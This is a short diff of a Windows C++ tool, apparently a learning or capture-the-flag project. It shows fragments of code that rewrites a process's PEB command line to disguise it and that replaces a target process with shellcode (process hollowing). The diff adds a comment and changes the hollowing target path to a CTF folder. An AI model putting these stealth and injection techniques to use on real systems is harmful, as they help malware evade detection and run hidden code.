@@ -128,6 +128,7 @@ BOOL CHide::DisguiseProcess(const wchar_t * lpwszPath, const wchar_t * lpwszCmd)
 	//获取指定进程中本信息结构体中的PebBaseAddress
 	ReadProcessMemory(GetCurrentProcess(), pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
 	//获取指定进程环境块结构中的ProcessParameters
+	//Param是需要修改的值
 	ReadProcessMemory(GetCurrentProcess(), peb.ProcessParameters, &Param, sizeof(Param), NULL);
 
 	// 修改指定进程环境块PEB中命令行信息, 注意指针指向的是指定进程空间中
@@ -280,7 +281,7 @@ void CHide::OnBnClickedPuppet()
 		return;
 	}
 	//使用ShellCode替换目标进程
-	if (FALSE == ReplaceProcess(L"F:\\FileCleaner2.0.exe", data, 624, 432))
+	if (FALSE == ReplaceProcess(L"E:\\CTF\\Repwn\\Repwn.exe", data, 624, 432))
 	{
 		m_Tip += "替换目标进程失败\r\n";
 	}
